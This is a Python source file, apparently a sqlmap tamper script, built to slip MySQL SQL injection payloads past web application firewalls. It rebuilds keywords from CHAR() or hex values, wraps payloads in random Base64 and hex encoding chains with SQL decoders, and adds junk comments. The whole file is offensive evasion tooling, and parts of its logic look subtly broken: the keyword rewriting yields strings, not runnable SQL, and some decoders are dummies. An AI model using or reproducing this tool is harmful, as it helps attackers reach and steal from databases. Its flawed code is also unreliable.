#!/usr/bin/env python

"""
perfect_stealth_v2.py

SQLMap tamper script focusing on advanced WAF evasion via keyword character construction
and dynamic, multi-layered encoding including Base64. Designed for MySQL.
"""

import random
import re
import base64
from urllib.parse import quote

# Define a set of highly sensitive keywords that will be character-constructed
SENSITIVE_KEYWORDS = [
    "SELECT", "FROM", "WHERE", "AND", "OR", "UNION", "ORDER BY", "GROUP BY",
    "HAVING", "LIMIT", "OFFSET", "INTO", "OUTFILE", "DUMPFILE", "LOAD_FILE",
    "SLEEP", "BENCHMARK", "VERSION", "DATABASE", "USER", "CURRENT_USER", "SCHEMA",
    "TABLE_NAME", "COLUMN_NAME", "INFORMATION_SCHEMA"
]

# Encoding schemes and their corresponding SQL decoding functions for MySQL
# 'identity' is a placeholder for no encoding in that layer
ENCODING_SCHEMES = {
    'url': {'encode': lambda s: quote(s, safe=''), 'decode_sql': 'CHAR(100)'}, # dummy, not directly applicable as SQL func
    'url_double': {'encode': lambda s: quote(quote(s, safe=''), safe=''), 'decode_sql': 'CHAR(100)'}, # dummy
    'base64': {'encode': lambda s: base64.b64encode(s.encode('latin1')).decode('latin1'), 'decode_sql': 'FROM_BASE64'},
    'hex': {'encode': lambda s: s.encode('latin1').hex(), 'decode_sql': 'UNHEX'},
}

def dependencies():
    # This tamper script does not have external dependencies beyond standard library
    pass

def _char_construct_keyword(keyword_original):
    """
    Dynamically constructs a keyword using CHAR() or CONCAT(0x...) for MySQL.
    This bypasses WAF pattern matching on literal keywords.
    """
    if not keyword_original:
        return ""

    # Choose between CHAR() and CONCAT(0x...)
    method = random.choice(['char_func', 'concat_hex'])
    
    parts = []
    for char_val in keyword_original.upper(): # Convert to upper for consistent CHAR() values
        if method == 'char_func':
            parts.append(f"CHAR({ord(char_val)})")
        else: # concat_hex
            parts.append(f"0x{ord(char_val):02x}") # Ensure two hex digits

    if method == 'char_func':
        return f"CONCAT({','.join(parts)})"
    else: # concat_hex
        return f"CONCAT({','.join(parts)})"

def _dynamic_encoding_chain_with_decoder(payload_part):
    """
    Applies a dynamic chain of encodings (including Base64) to a payload part,
    and returns the encoded string along with its SQL decoding wrapper.
    """
    if not payload_part:
        return "", ""

    current_encoded_payload = payload_part
    sql_decode_wrappers = []
    
    # Randomly select a chain length between 1 and 3 layers for "short" example
    chain_length = random.randint(1, 3) 
    
    available_schemes_keys = list(ENCODING_SCHEMES.keys())
    random.shuffle(available_schemes_keys) # Randomize order of available schemes

    for i in range(chain_length):
        if not available_schemes_keys: # No more schemes to apply
            break
        
        scheme_name = available_schemes_keys.pop(0) # Use one scheme from shuffled list
        scheme = ENCODING_SCHEMES[scheme_name]

        try:
            current_encoded_payload = scheme['encode'](current_encoded_payload)
            # Prepend the SQL decoding function to build the chain inside-out
            if scheme['decode_sql'] == 'FROM_BASE64':
                 # FROM_BASE64 needs string literals, so wrap with _latin1
                sql_decode_wrappers.insert(0, f"FROM_BASE64(CONVERT(%s USING latin1))")
            elif scheme['decode_sql'] == 'UNHEX':
                sql_decode_wrappers.insert(0, f"UNHEX(%s)")
            else:
                # For URL encoding, we rely on WAFs decoding it, not SQL functions directly
                # If we were to apply this, it would need custom SQL functions or a different approach
                # For this specific short example, we'll primarily use Base64 and Hex for SQL decoding
                pass 
        except Exception as e:
            # Fallback if encoding fails for some reason
            current_encoded_payload = payload_part
            sql_decode_wrappers = []
            break # Exit chain on error

    # Construct the final SQL wrapper string
    final_sql_wrapper = "%s"
    for wrapper_template in sql_decode_wrappers:
        final_sql_wrapper = wrapper_template % final_sql_wrapper
        
    return current_encoded_payload, final_sql_wrapper

def tamper(payload, **kwargs):
    """
    This tamper function applies character construction for sensitive keywords
    and dynamic encoding chains to the entire payload or critical parts.
    """
    if payload:
        ret = payload

        # Step 1: Replace sensitive keywords with character-constructed versions
        # Iterate in reverse order of length to avoid partial matches
        for keyword in sorted(SENSITIVE_KEYWORDS, key=len, reverse=True):
            if re.search(r"\b%s\b" % re.escape(keyword), ret, re.IGNORECASE):
                # Apply character construction, and ensure it's not already a function or comment
                # This regex is simplified for a "short" script, a full one would be more robust
                ret = re.sub(r"\b%s\b" % re.escape(keyword), _char_construct_keyword(keyword), ret, flags=re.IGNORECASE)

        # Step 2: Apply dynamic encoding chain to the *entire* modified payload
        # This makes the whole string unreadable without full decoding by the WAF
        encoded_payload, sql_decoder = _dynamic_encoding_chain_with_decoder(ret)
        
        # Inject junk comments for further disruption before applying final encoding
        junk_comment = f"/*{random.choice(['UNION', 'SELECT', 'OR', 'AND'])} {random.randint(1000,9999)}*/"
        
        # Wrap the encoded payload in the SQL decoder functions and add a comment
        # The encoded payload itself becomes a string literal (quoted)
        ret = f"{junk_comment} {sql_decoder % f\"'{encoded_payload}'\"}"

        return ret
    return payload

